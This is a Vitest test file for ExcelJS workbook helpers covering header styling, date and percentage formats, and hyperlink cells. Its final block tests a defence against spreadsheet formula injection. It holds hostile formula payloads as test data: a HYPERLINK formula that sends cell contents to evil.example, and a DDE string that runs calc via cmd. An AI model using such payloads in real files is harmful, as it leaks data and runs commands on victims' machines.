import ExcelJS from 'exceljs';
import { describe, expect, it } from 'vitest';
import { addTableSheet, createWorkbook, toBuffer, toExcelDate } from './workbook';

describe('excel workbook helpers', () => {
  it('writes only data sheets (no Info sheet), styles headers and formats dates/percentages', async () => {
    const wb = createWorkbook();
    addTableSheet(
      wb,
      'Data',
      [
        { header: 'Tanggal', key: 'd', value: (r: { d: string; p: number }) => r.d, format: 'date' },
        { header: 'Persen', key: 'p', value: (r: { d: string; p: number }) => r.p, format: 'pct' },
      ],
      [{ d: '2026-09-14', p: 42.9 }],
    );
    const back = new ExcelJS.Workbook();
    await back.xlsx.load((await toBuffer(wb)) as unknown as ArrayBuffer);
    expect(back.worksheets.map((w) => w.name)).toEqual(['Data']);
    const data = back.getWorksheet('Data')!;
    expect(data.getRow(1).font?.bold).toBe(true);
    expect(data.views[0]).toMatchObject({ state: 'frozen', ySplit: 1 });
    expect(data.getCell('A2').numFmt).toBe('dd-mm-yyyy');
    expect(data.getCell('B2').numFmt).toBe('0.0%');
    expect(data.getCell('B2').value).toBeCloseTo(0.429);
  });

  it("writes http(s) 'link' cells as hyperlinks and anything else as neutralized text", async () => {
    const wb = createWorkbook();
    const col = { header: 'Link IA', key: 'l', value: (r: { l: string | null }) => r.l, format: 'link' as const };
    addTableSheet(wb, 'Data', [col], [{ l: 'https://sim.example/api/files/a/ia/x.pdf' }, { l: '=cmd' }, { l: null }]);
    const back = new ExcelJS.Workbook();
    await back.xlsx.load((await toBuffer(wb)) as unknown as ArrayBuffer);
    const ws = back.getWorksheet('Data')!;
    expect(ws.getCell('A2').value).toMatchObject({ text: 'https://sim.example/api/files/a/ia/x.pdf', hyperlink: 'https://sim.example/api/files/a/ia/x.pdf' });
    expect(ws.getCell('A3').value).toBe("'=cmd");
    expect(ws.getCell('A4').value).toBeNull();
  });

  it('keeps calendar dates and shifts timestamps to WIB', () => {
    expect(toExcelDate('2026-09-14')!.toISOString()).toBe('2026-09-14T00:00:00.000Z');
    expect(toExcelDate('2026-09-13T20:00:00Z')!.toISOString()).toBe('2026-09-14T00:00:00.000Z');
    expect(toExcelDate('2026-09-13T20:30:00Z', true)!.toISOString()).toBe('2026-09-14T03:30:00.000Z');
  });
});

describe('formula injection (security review L-6)', () => {
  it('prefixes text cells that start with = + - @ TAB CR and leaves other text alone', async () => {
    const { neutralizeFormula } = await import('./workbook');
    expect(neutralizeFormula('=HYPERLINK("http://evil.example/?"&A1,"klik")')).toBe('\'=HYPERLINK("http://evil.example/?"&A1,"klik")');
    expect(neutralizeFormula("@SUM(1+1)*cmd|' /C calc'!A0")).toBe("'@SUM(1+1)*cmd|' /C calc'!A0");
    expect(neutralizeFormula('+62 812')).toBe("'+62 812");
    expect(neutralizeFormula('\tx')).toBe("'\tx");
    expect(neutralizeFormula('Seminar = keren')).toBe('Seminar = keren');

    const wb = createWorkbook();
    addTableSheet(wb, 'Data', [{ header: 'Judul', key: 't', value: (r: { t: string }) => r.t }], [{ t: '=1+1' }]);
    const back = new ExcelJS.Workbook();
    await back.xlsx.load((await toBuffer(wb)) as unknown as ArrayBuffer);
    expect(back.getWorksheet('Data')!.getCell('A2').value).toBe("'=1+1");
  });
});
